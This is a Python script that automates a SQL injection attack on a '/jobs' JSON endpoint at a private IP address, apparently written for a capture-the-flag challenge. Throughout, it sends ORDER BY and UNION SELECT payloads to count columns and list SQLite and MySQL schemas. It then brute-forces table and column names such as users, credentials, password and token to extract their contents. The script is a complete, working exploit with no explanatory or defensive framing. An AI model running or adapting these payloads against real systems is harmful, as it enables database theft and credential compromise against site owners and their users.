import requests
import json
import sys

TARGET_URL = "http://10.0.162.112:80/jobs"

def send_payload(session, payload):
    data = {"job_type": payload}
    try:
        resp = session.post(TARGET_URL, json=data, timeout=10)
        print(f"[{resp.status_code}] Payload: {payload[:80]}...")
        print(f"Response: {resp.text[:500]}")
        print("-" * 80)
        return resp
    except Exception as e:
        print(f"Error with payload {payload}: {e}")
        return None

def step1_order_by(session):
    print("\n" + "=" * 80)
    print("STEP 1: ORDER BY column count detection")
    print("=" * 80)
    for i in range(1, 7):
        payload = f"back-end' ORDER BY {i}--"
        resp = send_payload(session, payload)
        if resp is None or resp.status_code != 200:
            print(f"\n[!] ORDER BY {i} failed -> column count is {i - 1}")
            return i - 1
    return 6

def step2_union_columns(session):
    print("\n" + "=" * 80)
    print("STEP 2: UNION SELECT to find displayed columns")
    print("=" * 80)
    payload = "back-end' UNION SELECT 1,2,3,4--"
    send_payload(session, payload)
    payload = "' UNION SELECT 1,2,3,4--"
    send_payload(session, payload)
    payload = "back-end' UNION SELECT 'a','b','c','d'--"
    send_payload(session, payload)

def step3_sqlite_tables(session):
    print("\n" + "=" * 80)
    print("STEP 3a: SQLite - enumerate tables")
    print("=" * 80)
    payload = "' UNION SELECT 1,group_concat(name),3,4 FROM sqlite_master WHERE type='table'--"
    send_payload(session, payload)
    payload = "back-end' UNION SELECT 1,group_concat(name),3,4 FROM sqlite_master WHERE type='table'--"
    send_payload(session, payload)
    payload = "' UNION SELECT 1,group_concat(tbl_name),3,4 FROM sqlite_master WHERE type='table'--"
    send_payload(session, payload)
    payload = "' UNION SELECT 1,sql,3,4 FROM sqlite_master WHERE type='table'--"
    send_payload(session, payload)

def step3b_sqlite_columns(session, table_name):
    print(f"\n" + "=" * 80)
    print(f"STEP 3b: SQLite - enumerate columns for table '{table_name}'")
    print("=" * 80)
    payload = f"' UNION SELECT 1,group_concat(name),3,4 FROM pragma_table_info('{table_name}')--"
    send_payload(session, payload)
    payload = f"' UNION SELECT 1,sql,3,4 FROM sqlite_master WHERE type='table' AND name='{table_name}'--"
    send_payload(session, payload)

def step4_mysql_tables(session):
    print("\n" + "=" * 80)
    print("STEP 4: MySQL - enumerate schemas/tables")
    print("=" * 80)
    payload = "' UNION SELECT 1,schema_name,3,4 FROM information_schema.schemata--"
    send_payload(session, payload)
    payload = "' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables--"
    send_payload(session, payload)
    payload = "' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()--"
    send_payload(session, payload)

def step4b_mysql_columns(session, table_name):
    print(f"\n" + "=" * 80)
    print(f"STEP 4b: MySQL - enumerate columns for table '{table_name}'")
    print("=" * 80)
    payload = f"' UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='{table_name}'--"
    send_payload(session, payload)

def extract_flag(session, table_name, column_name):
    print(f"\n" + "=" * 80)
    print(f"STEP 5: Extracting flag from {table_name}.{column_name}")
    print("=" * 80)
    payload = f"' UNION SELECT 1,group_concat({column_name}),3,4 FROM {table_name}--"
    resp = send_payload(session, payload)
    if resp and resp.status_code == 200:
        try:
            data = resp.json()
            for row in data:
                for key, val in row.items():
                    if val and isinstance(val, str) and ('flag' in str(val).lower() or 'ctf' in str(val).lower() or 'HTB' in str(val)):
                        print(f"\n[!!!] FLAG FOUND: {val}")
        except:
            pass
    payload = f"' UNION SELECT 1,{column_name},3,4 FROM {table_name} LIMIT 1--"
    send_payload(session, payload)
    payload = f"' UNION SELECT {column_name},2,3,4 FROM {table_name}--"
    send_payload(session, payload)
    payload = f"' UNION SELECT 1,2,{column_name},4 FROM {table_name}--"
    send_payload(session, payload)
    payload = f"' UNION SELECT 1,2,3,{column_name} FROM {table_name}--"
    send_payload(session, payload)

def brute_flag_tables(session):
    print("\n" + "=" * 80)
    print("BRUTE: Trying common flag table/column names")
    print("=" * 80)
    tables = ['flag', 'flags', 'secret', 'secrets', 'ctf', 'challenge', 'hidden', 'config', 'users', 'credentials']
    columns = ['flag', 'secret', 'password', 'value', 'data', 'token', 'credential']
    for t in tables:
        for c in columns:
            payload = f"' UNION SELECT 1,group_concat({c}),3,4 FROM {t}--"
            data = {"job_type": payload}
            try:
                resp = session.post(TARGET_URL, json=data, timeout=5)
                if resp.status_code == 200 and len(resp.text) > 50:
                    print(f"[+] HIT: {t}.{c} -> {resp.text[:300]}")
                    try:
                        j = resp.json()
                        for row in j:
                            for k, v in row.items():
                                if v and str(v) not in ['2', '3', '4', '1']:
                                    print(f"  [*] {k}: {v}")
                    except:
                        pass
            except:
                pass

def main():
    session = requests.Session()
    session.headers.update({"Content-Type": "application/json"})

    print("[*] Testing baseline request...")
    resp = send_payload(session, "back-end")

    print("\n[*] Testing single quote injection...")
    resp = send_payload(session, "back-end'")

    col_count = step1_order_by(session)

    step2_union_columns(session)

    step3_sqlite_tables(session)

    step4_mysql_tables(session)

    common_flag_tables = ['flag', 'flags', 'secret', 'secrets', 'hidden_flag', 'ctf_flag']
    for t in common_flag_tables:
        step3b_sqlite_columns(session, t)
        step4b_mysql_columns(session, t)

    for t in common_flag_tables:
        for c in ['flag', 'secret', 'value', 'data', 'password']:
            extract_flag(session, t, c)

    brute_flag_tables(session)

    print("\n" + "=" * 80)
    print("[*] Manual investigation payloads:")
    print("=" * 80)
    manual_payloads = [
        "' UNION SELECT 1,group_concat(sql),3,4 FROM sqlite_master--",
        "' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()--",
        "' UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name=0x666c6167--",
        "' UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='flag'--",
        "' UNION SELECT flag,2,3,4 FROM flag--",
        "' UNION SELECT 1,flag,3,4 FROM flag--",
        "' UNION SELECT 1,2,3,flag FROM flag--",
        "' UNION SELECT group_concat(flag),2,3,4 FROM flag--",
        "' UNION SELECT 1,group_concat(flag),3,4 FROM flag--",
        "' OR 1=1--",
        "' UNION SELECT 1,group_concat(name),3,4 FROM sqlite_master--",
        "' UNION SELECT 1,group_concat(tbl_name),3,4 FROM sqlite_master WHERE type='table'--",
    ]
    for p in manual_payloads:
        send_payload(session, p)

if __name__ == "__main__":
    main()